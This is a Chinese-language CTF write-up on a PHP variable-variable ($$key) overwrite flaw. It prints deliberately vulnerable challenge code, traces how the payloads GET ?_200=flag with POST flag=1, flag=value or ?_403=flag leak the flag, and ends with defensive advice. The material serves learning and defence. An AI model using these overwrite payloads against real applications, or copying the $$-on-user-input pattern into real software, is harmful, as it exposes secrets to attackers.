# PHP 变量变量（$$）覆盖绕过

> 用户可控的 GET/POST 参数名被直接用作 PHP 变量名（`$$key`），攻击者得以覆写任意全局变量。本挑战的思路：把 flag.php 中的 `$flag` 通过变量覆盖拷进 `$_200`，再利用脚本末尾的 `die($_200)` 把真实 flag 带出。

---

## 题目源码

```php
<?php
include "flag.php";           // 定义 $flag = "FLAG{真实值}"，内容未知

$_403 = "Access Denied";
$_200 = "Welcome Admin";

if (!isset($_POST["flag"]))   // 必须 POST 一个 flag 参数
    die($_403);

foreach ($_GET as $key => $value)
    $$key = $$value;          // 用户可控的键名 → 变量覆盖

foreach ($_POST as $key => $value)
    $$key = $$value;

if ($_POST["flag"] !== $flag) // 认证检查（严格比较）
    die($_403);

echo "This is your flag : ". $flag . "\n";
die($_200);                   // 成功分支，输出 $_200
?>
```

---

## 核心概念：变量变量（Variable Variables）

`$$key` 表示"变量名为 `$key` 的值的那一个变量"：

```php
$key = "_200";
$$key = "abc";      // 等价于 $_200 = "abc";

$value = "flag";
$$value;            // 等价于 $flag
```

危害：`$key`、`$value` 来自 GET/POST 的参数名时，攻击者可以对**任意已存在变量**赋值，包括 `$_403`、`$_200`、`$flag`，甚至超全局变量。

---

## 解题流程：POST flag=1 + GET _200=flag

```
GET:  ?_200=flag
POST: flag=1
```

### 逐变量追踪

假设 `flag.php` 中 `$flag = "FLAG{real_value}"`。

**初始状态**

| 变量 | 值 |
|------|-----|
| `$flag` | `"FLAG{real_value}"`（来自 flag.php） |
| `$_403` | `"Access Denied"` |
| `$_200` | `"Welcome Admin"` |

**第一个 foreach（GET: `?_200=flag`）**

```
$key = '_200'    $value = 'flag'
$$key = $$value  →  $_200 = $flag  →  $_200 = "FLAG{real_value}"
```

这一步是整道题的枢纽：**真实 flag 被复制进了 `$_200`**。`$flag` 本身未变。

| 变量 | 值 |
|------|-----|
| `$flag` | `"FLAG{real_value}"`（未变） |
| `$_200` | `"FLAG{real_value}"` ← 真实 flag 已暂存于此 |

**第二个 foreach（POST: `flag=1`）**

```
$key = 'flag'    $value = '1'
$$key = $$value  →  $flag = ${'1'}   // 名为 "1" 的变量的值赋给 $flag
```

**检查门**

```
$_POST['flag']  === $flag
"1"             === $flag     → 通过，脚本继续
```

**输出**

```
echo "This is your flag : " . $flag . "\n";
die($_200);                    // 输出真实 flag："FLAG{real_value}"
```

---

## 关键点：那道 `!==` 门

```
if ($_POST["flag"] !== $flag)
    die($_403);
```

- 要走到最后一行的 `die($_200)`，**必须先让 `$_POST['flag'] === $flag` 成立**。
- POST 提交的值经过 `$flag = ${$_POST['flag']}` 覆盖后，`$flag` 必须恰好等于提交值本身。即提交 `flag=1` 时，需要环境中 `$1` 变量的值恰好是 `"1"`。
- `GET _200=flag` 之所以选 `_200`，正是因为脚本末尾的 `die($_200)` 是成功分支的输出点——把 flag 存进 `$_200`，最后一行就把它打印出来。

---

## 对原推理的审查

原注释中的几处错误：

| 原注释 | 实际情况 |
|--------|---------|
| "原本 `$_200` 的值变为了 `$flag` 的值为 1" | `$_200` = 真实 flag 值，与数字 1 无关 |
| "原本 `$flag=1`" | `$flag` 由 flag.php 定义，是未知的真实 flag；POST 提交的 `1` 属于 `$_POST['flag']` |
| "`$flag=$1` 的值=未知" | `$flag` 被赋值为名为 `1` 的变量的值，这个值决定检查是否通过 |
| "最终 `$_200=$flag=$1`" | 链条混淆：`$_200` 已是真实 flag；`$flag` 在 POST 后被覆盖，两者不再相等 |

正确的链条是：

```
$flag(真实值) --GET foreach--> $_200 --检查通过--> die($_200) 输出
```

---

## 标准 PHP 下的可靠变体

`POST flag=1` 能否通过检查取决于环境中 `$1` 是否被定义。在标准 PHP（无 `$1`）下，有两个已验证的替代 payload：

**变体 1：利用循环变量 `$value` 自引用（通过检查）**

```
GET:  ?_200=flag
POST: flag=value
```

```
POST flag=value 时，循环变量 $value = "value"
$$key = $$value → $flag = ${'value'} = $value = "value"
检查: "value" === "value" → 通过
die($_200) → 真实 flag
```

关键：foreach 的 `$value` 变量本身是"值等于其名字"的字符串，天然自引用。

**变体 2：直接利用失败分支 `die($_403)`（不通过检查）**

```
GET:  ?_403=flag
POST: flag=任意值
```

```
GET 后: $_403 = $flag = "FLAG{real_value}"
检查必然失败 → die($_403) → 输出真实 flag
```

---

## 安全防护

| 手段 | 说明 |
|------|------|
| 禁止 `$$` 处理用户输入 | 永远不要让用户可控的字符串充当变量名 |
| 白名单赋值 | 只允许白名单内的键参与覆盖 |
| 警惕 `extract()` / `parse_str()` | 同样可造成变量覆盖，须限制前缀/白名单 |
| 敏感状态不用裸全局变量 | 存于 `$_SESSION` 等容器，避免全局命名空间被污染 |
| `register_globals` 早已移除 | 历史根源：PHP < 5.4 曾把输入直接导入全局命名空间 |

---

## 参考

- PHP Manual: [Variable variables](https://www.php.net/manual/en/language.variables.variable.php)
- CWE-621: Variable Extraction
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- 相关笔记：[[PHP类型混淆绕过]]
